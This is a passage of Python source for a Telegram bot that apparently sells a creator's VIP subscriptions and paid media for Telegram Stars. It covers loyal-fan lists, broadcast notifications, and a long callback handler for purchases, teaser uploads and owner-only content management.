        markup.add(types.InlineKeyboardButton("⭐ Mark First Loyal Fan", callback_data="mark_loyal_fan"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Loyal Fan Management", callback_data="loyal_fan_management_menu"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    loyal_text = f"""
📋 <b>LOYAL FANS LIST</b> 📋

⭐ <b>Your {len(loyal_fans)} loyal fan(s):</b>

"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for user_id, username, first_name, stars_spent, reason, date_marked in loyal_fans:
        # Escape HTML special characters
        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        safe_reason = (reason or 'No reason specified').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        
        # Format date
        try:
            date_obj = datetime.datetime.fromisoformat(date_marked)
            formatted_date = date_obj.strftime("%b %d, %Y")
        except:
            formatted_date = "Unknown"
        
        loyal_text += f"⭐ <b>{safe_first_name} (@{safe_username})</b>\n"
        loyal_text += f"   💰 {stars_spent} Stars spent\n"
        loyal_text += f"   📝 Reason: {safe_reason}\n"
        loyal_text += f"   📅 Marked: {formatted_date}\n\n"
        
        # Add remove button for each loyal fan
        markup.add(types.InlineKeyboardButton(f"❌ Remove {first_name}", callback_data=f"remove_loyal_{user_id}"))
    
    markup.add(types.InlineKeyboardButton("⭐ Mark New Loyal Fan", callback_data="mark_loyal_fan"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Loyal Fan Management", callback_data="loyal_fan_management_menu"))
    
    bot.send_message(chat_id, loyal_text, reply_markup=markup, parse_mode='HTML')

def show_remove_loyal_fan_interface(chat_id):
    """Show interface to remove loyal fan status"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT u.user_id, u.username, u.first_name, l.reason, l.date_marked
        FROM loyal_fans l
        JOIN users u ON l.user_id = u.user_id
        ORDER BY l.date_marked DESC
    ''')
    loyal_fans = cursor.fetchall()
    conn.close()
    
    if not loyal_fans:
        empty_text = """
❌ <b>REMOVE LOYAL STATUS</b> ❌

📭 <b>No loyal fans to remove!</b>

You haven't marked any users as loyal fans yet.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⭐ Mark First Loyal Fan", callback_data="mark_loyal_fan"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Loyal Fan Management", callback_data="loyal_fan_management_menu"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    remove_text = f"""
❌ <b>REMOVE LOYAL STATUS</b> ❌

⚠️ <b>Select a loyal fan to remove their status:</b>

Found {len(loyal_fans)} loyal fan(s). This action cannot be undone!
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for user_id, username, first_name, reason, date_marked in loyal_fans:
        # Escape HTML special characters
        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        
        # Format date
        try:
            date_obj = datetime.datetime.fromisoformat(date_marked)
            formatted_date = date_obj.strftime("%b %d")
        except:
            formatted_date = "Unknown"
        
        # Create button text
        button_text = f"❌ {safe_first_name} (@{safe_username}) | {formatted_date}"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"confirm_remove_loyal_{user_id}"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to Loyal Fan Management", callback_data="loyal_fan_management_menu"))
    
    bot.send_message(chat_id, remove_text, reply_markup=markup, parse_mode='HTML')

# Notification System Functions

def show_notification_composer(chat_id, target_group):
    """Show notification composer interface"""
    target_names = {
        'all': 'All Users',
        'vip': 'VIP Members',
        'non_vip': 'Non-VIP Users'
    }
    
    target_name = target_names.get(target_group, 'Unknown')
    
    # Get target user count
    if target_group == 'all':
        users = get_all_users()
    elif target_group == 'vip':
        users = get_vip_subscribers()
    elif target_group == 'non_vip':
        users = get_non_vip_users()
    else:
        users = []
    
    user_count = len(users)
    
    composer_text = f"""
📢 <b>NOTIFICATION COMPOSER</b> 📢

🎯 <b>Target Group:</b> {target_name}
👥 <b>Recipients:</b> {user_count} users

📝 <b>Instructions:</b>
Send your message in your next message. It will be delivered to all {target_name.lower()}.

✨ <b>Tips:</b>
• Use HTML formatting (bold: &lt;b&gt;text&lt;/b&gt;, italic: &lt;i&gt;text&lt;/i&gt;)
• Keep messages engaging and personal
• Include relevant emojis for better engagement
• Messages will be pinned for VIP notifications

💡 <b>Ready to compose your message!</b>
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="notification_management_menu"))
    
    bot.send_message(chat_id, composer_text, reply_markup=markup, parse_mode='HTML')
    
    # Store the notification session
    notification_sessions[chat_id] = {
        'target_group': target_group,
        'users': users,
        'waiting_for_message': True
    }

# Callback query handlers

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    """Handle inline keyboard callbacks"""
    
    # Register user interaction for all callback queries
    add_or_update_user(call.from_user)
    
    if call.data == "vip_access":
        show_vip_access(call.message.chat.id, call.from_user.id)
    elif call.data == "buy_vip":
        purchase_vip_subscription(call.message.chat.id, call.from_user.id)
    elif call.data == "teasers":
        teaser_command(call.message)
    elif call.data == "browse_content":
        show_content_catalog(call.message.chat.id, call.from_user.id)
    elif call.data == "vip_content_catalog":
        show_vip_catalog(call.message.chat.id, call.from_user.id)
    elif call.data == "my_content":
        show_my_content(call.message.chat.id, call.from_user.id)
    elif call.data == "ask_question":
        # Check if user has VIP or has purchased content
        user_id = call.from_user.id
        vip_status = check_vip_status(user_id)
        purchased_content = get_user_purchased_content(user_id)
        
        # User qualifies if they have VIP or have bought content
        user_qualifies = vip_status['is_vip'] or len(purchased_content) > 0
        
        if user_qualifies:
            # Show contact info for qualifying users
            contact_message = """
💬 **Direct Contact Available** 💬

🎉 Congrats, babe! As my VIP, you’re now at the front of the line:

👤 **Contact me:** @blahgigi_official

💕 I personally see and reply to every message from my supporters.

🌟 **What you can expect:**
• Personal responses from me
• Behind-the-scenes conversations
• Priority attention to your messages
• Exclusive chat access

✨ Babe, You’re not just a follower you’re part of my inner circle,I’ll keep giving you the best. !
"""
            markup = types.InlineKeyboardMarkup()
            # Create URL button for direct contact
            markup.add(types.InlineKeyboardButton("💬 Message @elylabella_official", url="https://t.me/elylabella_official"))
            markup.add(types.InlineKeyboardButton("🛒 Browse More Content", callback_data="browse_content"))
            markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
            
            bot.send_message(call.message.chat.id, contact_message, reply_markup=markup)
        else:
            # Show VIP upgrade message for non-qualifying users
            fomo_message = """
🚫 **Chat Access Restricted** 🚫

💎 This feature is exclusive to VIP members and content purchasers only!

🌟 **You're missing out on:**
• Direct personal conversations with me
• Priority responses to all your messages  
• Exclusive behind-the-scenes chat access
• Personal attention and custom interactions

💰 Upgrade to VIP or purchase content to unlock direct chat access!
"""
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("💎 Upgrade to VIP Now", callback_data="vip_access"))
            markup.add(types.InlineKeyboardButton("🛒 Browse Content Instead", callback_data="browse_content"))
            
            bot.send_message(call.message.chat.id, fomo_message, reply_markup=markup)
    elif call.data == "help":
        help_command(call.message)
    elif call.data == "cmd_help":
        help_command(call.message)
    elif call.data == "cmd_start":
        # Create proper message object with callback user info
        fake_message = type('obj', (object,), {
            'chat': call.message.chat,
            'from_user': call.from_user,
            'message_id': call.message.message_id
        })
        start_command(fake_message)
    elif call.data == "cmd_teaser":
        # Create proper message object with callback user info
        fake_message = type('obj', (object,), {
            'chat': call.message.chat,
            'from_user': call.from_user,
            'message_id': call.message.message_id
        })
        teaser_command(fake_message)
    elif call.data == "buy_premium":
        show_content_catalog(call.message.chat.id)
    elif call.data.startswith("buy_"):
        item_name = call.data.replace("buy_", "")
        purchase_item(call.message.chat.id, call.from_user.id, item_name)
    elif call.data.startswith("vip_get_"):
        item_name = call.data.replace("vip_get_", "")
        deliver_vip_content(call.message.chat.id, call.from_user.id, item_name)
    elif call.data.startswith("access_"):
        item_name = call.data.replace("access_", "")
        deliver_owned_content(call.message.chat.id, call.from_user.id, item_name)
    elif call.data == "owner_list_teasers":
        if not is_owner(call.from_user.id):
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
        else:
            # Create fake message object for the owner_list_teasers function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user,
                'message_id': call.message.message_id
            })
            owner_list_teasers(fake_message)
    elif call.data == "owner_help":
        if not is_owner(call.from_user.id):
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
        else:
            # Create fake message object for the owner_help function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user,
                'message_id': call.message.message_id
            })
            owner_help(fake_message)
    elif call.data == "owner_add_content":
        if not is_owner(call.from_user.id):
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
        else:
            bot.send_message(call.message.chat.id, "📦 Use: /owner_add_content [name] [price] [url] [description]")
    elif call.data == "owner_list_users":
        if not is_owner(call.from_user.id):
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
        else:
            # Create a fake message object for the owner_list_users function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user
            })
            owner_list_users(fake_message)
    elif call.data == "cancel_upload":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions:
            del upload_sessions[OWNERS[0]]
            bot.send_message(call.message.chat.id, "❌ Upload cancelled.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active upload session.")
    elif call.data == "skip_description":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions:
            session = upload_sessions[OWNERS[0]]
            if session['step'] == 'waiting_for_description':
                session['description'] = f"Exclusive {session.get('file_type', 'content').lower()} content"
                save_uploaded_content(session)
            else:
                bot.send_message(call.message.chat.id, "❌ Invalid step for skipping description.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active upload session.")
    elif call.data == "start_upload":
        if call.from_user.id == OWNER_ID:
            # Create a fake message object for the owner_upload_content function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user,
                'text': '/owner_upload'
            })
            owner_upload_content(fake_message)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "start_teaser_upload":
        if call.from_user.id == OWNER_ID:
            # Create a fake message object for the teaser upload function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user,
                'text': '/owner_upload_teaser'
            })
            owner_upload_teaser(fake_message)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "cancel_teaser_upload":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser':
            del upload_sessions[OWNERS[0]]
            bot.send_message(call.message.chat.id, "❌ Teaser upload cancelled.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active teaser upload session.")
    elif call.data == "skip_teaser_description":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser':
            session = upload_sessions[OWNERS[0]]
            if session['step'] == 'waiting_for_description':
                session['description'] = "Exclusive teaser content"
                # Save teaser to database
                try:
                    add_teaser(session['file_id'], session['file_type'], session['description'])
                    
                    success_text = f"""
🎉 **TEASER UPLOADED SUCCESSFULLY!** 🎉

🎬 **Type:** {session['file_type'].title()}
📝 **Description:** {session['description']}

Your teaser is now live! Non-VIP users will see this when they use /teaser.

🔄 You can upload multiple teasers - the most recent one will be shown first.
"""
                    
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("🎬 Upload Another Teaser", callback_data="start_teaser_upload"))
                    markup.add(types.InlineKeyboardButton("👥 View Customers", callback_data="owner_list_users"))
                    
                    bot.send_message(call.message.chat.id, success_text, reply_markup=markup)
                    
                    # Clear upload session
                    del upload_sessions[OWNERS[0]]
                    
                except Exception as e:
                    bot.send_message(call.message.chat.id, f"❌ Error saving teaser: {str(e)}")
                    if OWNERS[0] in upload_sessions:
                        del upload_sessions[OWNERS[0]]
            else:
                bot.send_message(call.message.chat.id, "❌ Invalid step for skipping description.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active teaser upload session.")
    # VIP Management callbacks
    elif call.data == "cmd_vip":
        if call.from_user.id == OWNER_ID:
            # Create fake message object for the vip_command function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user,
                'text': '/vip'
            })
            vip_command(fake_message)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "owner_list_vips":
        if call.from_user.id == OWNER_ID:
            # Create fake message object for the owner_list_vips function
            fake_message = type('obj', (object,), {
                'chat': call.message.chat,
                'from_user': call.from_user,
                'text': '/owner_list_vips'
            })
            owner_list_vips(fake_message)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_add_content":
        if call.from_user.id == OWNER_ID:
            show_vip_add_content_interface(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "start_vip_upload":
        if call.from_user.id == OWNER_ID:
            start_vip_upload_session(call.message.chat.id, call.from_user.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "cancel_vip_upload":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content':
            del upload_sessions[OWNERS[0]]
            bot.send_message(call.message.chat.id, "❌ VIP upload cancelled.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active VIP upload session.")
    elif call.data == "use_suggested_name":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content':
            session = upload_sessions[OWNERS[0]]
            if session['step'] == 'waiting_for_name' and 'suggested_name' in session:
                # Check if suggested name is unique
                suggested_name = session['suggested_name']
                
                # Check if name already exists
                conn = sqlite3.connect('content_bot.db')
                cursor = conn.cursor()
                cursor.execute('SELECT name FROM content_items WHERE name = ?', (suggested_name,))
                existing = cursor.fetchone()
                conn.close()
                
                if existing:
                    # Make name unique by adding timestamp
                    timestamp = datetime.datetime.now().strftime('%H%M%S')
                    suggested_name = f"{suggested_name}_{timestamp}"
                
                session['name'] = suggested_name
                session['step'] = 'waiting_for_description'
                
                desc_text = f"""
✅ <b>Name set:</b> {suggested_name}

📝 <b>Step 3: Description (Optional)</b>
Add a description that VIP members will see:

💡 <b>Examples:</b>
• "Exclusive behind-the-scenes content"
• "Special VIP-only photo set"
• "Premium video content for VIPs"

✏️ Type your description or skip to use a default:
"""
                
                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(types.InlineKeyboardButton("⏭️ Skip Description", callback_data="skip_vip_description"))
                markup.add(types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_vip_upload"))
                
                bot.send_message(call.message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')
            else:
                bot.send_message(call.message.chat.id, "❌ Invalid step for using suggested name.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active VIP upload session.")
    elif call.data == "skip_vip_description":
        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content':
            session = upload_sessions[OWNERS[0]]
            if session['step'] == 'waiting_for_description':
                session['description'] = f"Exclusive VIP {session.get('file_type', 'content').lower()}"
                session['price'] = 0  # VIP content is free for VIP members
                save_uploaded_content(session)
            else:
                bot.send_message(call.message.chat.id, "❌ Invalid step for skipping description.")
        else:
            bot.send_message(call.message.chat.id, "❌ No active VIP upload session.")
    elif call.data == "vip_manage_content":
        if call.from_user.id == OWNER_ID:
            show_vip_content_management(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_settings":
        if call.from_user.id == OWNER_ID:
            show_vip_settings_interface(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Interactive VIP Settings Handlers
    elif call.data == "vip_set_price_btn":
        if call.from_user.id == OWNER_ID:
            # Start VIP price setting session
            upload_sessions[OWNERS[0]] = {
                'type': 'vip_settings',
                'setting': 'price',
                'step': 'waiting_for_input'
            }
            
            price_text = """
💰 <b>SET VIP SUBSCRIPTION PRICE</b> 💰

💡 Enter the new VIP price in Telegram Stars (just the number):

<b>Examples:</b>
• 399 (current default)
• 500
• 1000
• 5000

💡 <b>Pricing Guide:</b>
• Range: 1 - 150,000 Stars
• 399 Stars ≈ $4 USD | 1,000 Stars ≈ $10 USD
• Higher prices make VIP feel more exclusive

✏️ <b>Just type the number and send:</b>
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="vip_settings"))
            
            bot.send_message(call.message.chat.id, price_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    elif call.data == "vip_set_duration_btn":
        if call.from_user.id == OWNER_ID:
            # Start VIP duration setting session
            upload_sessions[OWNERS[0]] = {
                'type': 'vip_settings',
                'setting': 'duration',
                'step': 'waiting_for_input'
            }
            
            duration_text = """
⏰ <b>SET VIP SUBSCRIPTION DURATION</b> ⏰

📅 Enter the VIP duration in days (just the number):

<b>Examples:</b>
• 7 (1 week)
• 30 (1 month - recommended)
• 90 (3 months)
• 365 (1 year)

💡 <b>Duration Tips:</b>
• 30 days balances value and recurring revenue
• Shorter durations = more frequent renewals
• Longer durations = better customer value

✏️ <b>Just type the number and send:</b>
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="vip_settings"))
            
            bot.send_message(call.message.chat.id, duration_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    elif call.data == "vip_set_description_btn":
        if call.from_user.id == OWNER_ID:
            # Start VIP description setting session
            upload_sessions[OWNERS[0]] = {
                'type': 'vip_settings',
                'setting': 'description',
                'step': 'waiting_for_input'
            }
            
            desc_text = """
📝 <b>SET VIP SUBSCRIPTION DESCRIPTION</b> 📝

✏️ Enter the new VIP description text:

<b>This description appears when users see the VIP upgrade option.</b>

💡 <b>Examples:</b>
• "Premium VIP access with exclusive content and direct chat"
• "Unlock all exclusive content and get personal attention"
• "VIP membership: exclusive photos, videos, and direct messaging"

🎯 <b>Tips for great descriptions:</b>
• Highlight exclusive benefits
• Mention direct access/chat
• Keep it concise but appealing
• Focus on what makes VIP special

✏️ <b>Type your description and send:</b>
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="vip_settings"))
            
            bot.send_message(call.message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    elif call.data == "vip_analytics":
        if call.from_user.id == OWNER_ID:
            show_vip_analytics(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_teasers_management":
        if call.from_user.id == OWNER_ID:
            show_vip_teasers_management(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_teaser_upload":
        if call.from_user.id == OWNER_ID:
            start_vip_teaser_upload_session(call.message.chat.id, call.from_user.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_teaser_delete":
        if call.from_user.id == OWNER_ID:
            show_vip_teaser_deletion_interface(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_teaser_edit":
        if call.from_user.id == OWNER_ID:
            show_vip_teaser_edit_interface(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "skip_vip_teaser_description":
        teaser_key = f"{OWNER_ID}_vip_teaser"
        if call.from_user.id == OWNER_ID and teaser_key in upload_sessions and upload_sessions[teaser_key].get('type') == 'vip_teaser':
            session = upload_sessions[teaser_key]
            description = "Exclusive VIP teaser content"
            
            try:
                add_teaser(session['file_path'], session['file_type'], description, vip_only=True)
                
                # Send notifications to all VIP subscribers about the new VIP teaser
                notification_stats = notify_vip_teaser_uploaded(description)
                
                success_text = f"""
🎉 <b>VIP TEASER UPLOADED SUCCESSFULLY!</b> 🎉

🎬 <b>Type:</b> {session['file_type'].title()}
📝 <b>Description:</b> {description}

💎 Your VIP teaser is now live! VIP members will see this exclusive content when they use /teaser.

📱 <b>VIP Notifications Sent:</b>
✅ Delivered to {notification_stats['sent']} VIP members
🚫 {notification_stats['blocked']} users have blocked the bot
❌ {notification_stats['failed']} delivery failures

🔄 You can upload multiple VIP teasers - the most recent one will be shown first to VIP members.
"""
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🎬 Upload Another VIP Teaser", callback_data="vip_teaser_upload"))
                markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
                
                bot.send_message(call.message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
                
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ Error saving VIP teaser: {str(e)}")
            
            # Clear upload session
            if teaser_key in upload_sessions:
                del upload_sessions[teaser_key]
    elif call.data.startswith("delete_vip_teaser_"):
        if call.from_user.id == OWNER_ID:
            teaser_id = int(call.data.replace("delete_vip_teaser_", ""))
            success = delete_teaser(teaser_id)
            
            if success:
                bot.send_message(call.message.chat.id, f"✅ VIP teaser deleted successfully!")
                show_vip_teasers_management(call.message.chat.id)
            else:
                bot.send_message(call.message.chat.id, f"❌ VIP teaser not found.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("edit_vip_teaser_"):
        if call.from_user.id == OWNER_ID:
            teaser_id = int(call.data.replace("edit_vip_teaser_", ""))
            start_vip_teaser_edit_session(call.message.chat.id, teaser_id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "vip_teasers_collection":
        show_vip_teasers_collection(call.message.chat.id, call.from_user.id)
    elif call.data.startswith("vip_delete_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("vip_delete_", "")
            handle_vip_content_deletion(call.message.chat.id, content_name)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("vip_edit_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("vip_edit_", "")
            show_vip_content_edit_interface(call.message.chat.id, content_name)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("confirm_vip_delete_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("confirm_vip_delete_", "")
            # Actually delete the VIP content
            if delete_vip_content(content_name):
                bot.send_message(call.message.chat.id, f"✅ VIP content '{content_name}' deleted successfully!")
                # Go back to VIP content management
                show_vip_content_management(call.message.chat.id)
            else:
                bot.send_message(call.message.chat.id, f"❌ Failed to delete VIP content '{content_name}'.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # New VIP content inline editing handlers
    elif call.data.startswith("vip_upload_file_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("vip_upload_file_", "")
            # Start file upload session for this specific VIP content
            upload_sessions[OWNERS[0]] = {
                'type': 'vip_file_update',
                'step': 'waiting_for_file',
                'content_name': content_name,
                'name': content_name,
                'file_path': None
            }
            
            upload_text = f"""
📁 <b>UPLOAD NEW FILE FOR VIP CONTENT</b> 📁

<b>Content:</b> {content_name}

📤 <b>Send me the new file:</b>
• Photo (JPG, PNG, etc.)
• Video (MP4)
• Animated GIF

📝 Just upload the new file and I'll replace the current one!
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data=f"vip_edit_{content_name}"))
            
            bot.send_message(call.message.chat.id, upload_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    elif call.data.startswith("vip_edit_price_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("vip_edit_price_", "")
            price_text = f"""
💰 <b>EDIT PRICE FOR VIP CONTENT</b> 💰

<b>Content:</b> {content_name}

💡 <b>Note:</b> VIP content is typically set to 0 Stars because VIP members get FREE access to all VIP content. The subscription fee is what generates revenue.

<b>Quick Command:</b>
<code>/owner_edit_vip_price {content_name} [new_price]</code>

Example: <code>/owner_edit_vip_price {content_name} 0</code>
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back to Edit", callback_data=f"vip_edit_{content_name}"))
            
            bot.send_message(call.message.chat.id, price_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    elif call.data.startswith("vip_edit_desc_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("vip_edit_desc_", "")
            desc_text = f"""
📝 <b>EDIT DESCRIPTION FOR VIP CONTENT</b> 📝

<b>Content:</b> {content_name}

✏️ <b>Quick Command:</b>
<code>/owner_edit_vip_description {content_name} [new_description]</code>

<b>Example:</b>
<code>/owner_edit_vip_description {content_name} Exclusive premium VIP content just for you!</code>
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back to Edit", callback_data=f"vip_edit_{content_name}"))
            
            bot.send_message(call.message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Edit Content handlers
    elif call.data == "show_edit_content_menu":
        if call.from_user.id == OWNER_ID:
            show_edit_content_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("edit_content_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("edit_content_", "")
            show_content_edit_interface(call.message.chat.id, content_name)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("confirm_delete_content_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("confirm_delete_content_", "")
            # Delete the content
            conn = sqlite3.connect('content_bot.db')
            cursor = conn.cursor()
            cursor.execute('DELETE FROM content_items WHERE name = ?', (content_name,))
            deleted_count = cursor.rowcount
            conn.commit()
            conn.close()
            
            if deleted_count > 0:
                bot.send_message(call.message.chat.id, f"✅ Content '{content_name}' deleted successfully!")
                # Go back to edit content menu
                show_edit_content_menu(call.message.chat.id)
            else:
                bot.send_message(call.message.chat.id, f"❌ Failed to delete content '{content_name}'.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("confirm_delete_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("confirm_delete_", "")
            # Delete the content
            conn = sqlite3.connect('content_bot.db')
            cursor = conn.cursor()
            cursor.execute('DELETE FROM content_items WHERE name = ?', (content_name,))
            deleted_count = cursor.rowcount
            conn.commit()
            conn.close()
            
            if deleted_count > 0:
                bot.send_message(call.message.chat.id, f"✅ Content '{content_name}' deleted successfully!")
                # Go back to delete content menu to show updated list
                show_delete_content_menu(call.message.chat.id)
            else:
                bot.send_message(call.message.chat.id, f"❌ Failed to delete content '{content_name}'.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Edit Content field handlers
    elif call.data.startswith("edit_price_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("edit_price_", "")
            bot.send_message(call.message.chat.id, f"💰 To edit price for '{content_name}', use:\n<code>/owner_edit_price {content_name} [new_price]</code>\n\nExample: <code>/owner_edit_price {content_name} 50</code>", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("edit_description_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("edit_description_", "")
            bot.send_message(call.message.chat.id, f"📝 To edit description for '{content_name}', use:\n<code>/owner_edit_description {content_name} [new_description]</code>\n\nExample: <code>/owner_edit_description {content_name} Amazing exclusive content!</code>", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("edit_file_path_"):
        if call.from_user.id == OWNER_ID:
            content_name = call.data.replace("edit_file_path_", "")
            bot.send_message(call.message.chat.id, f"📁 To edit file path for '{content_name}', use:\n<code>/owner_edit_file_path {content_name} [new_file_path]</code>\n\nExample: <code>/owner_edit_file_path {content_name} https://example.com/newfile.jpg</code>", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Analytics Dashboard handler
    elif call.data == "analytics_dashboard":
        if call.from_user.id == OWNER_ID:
            show_analytics_dashboard(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Section menu handlers
    elif call.data == "content_management_menu":
        if call.from_user.id == OWNER_ID:
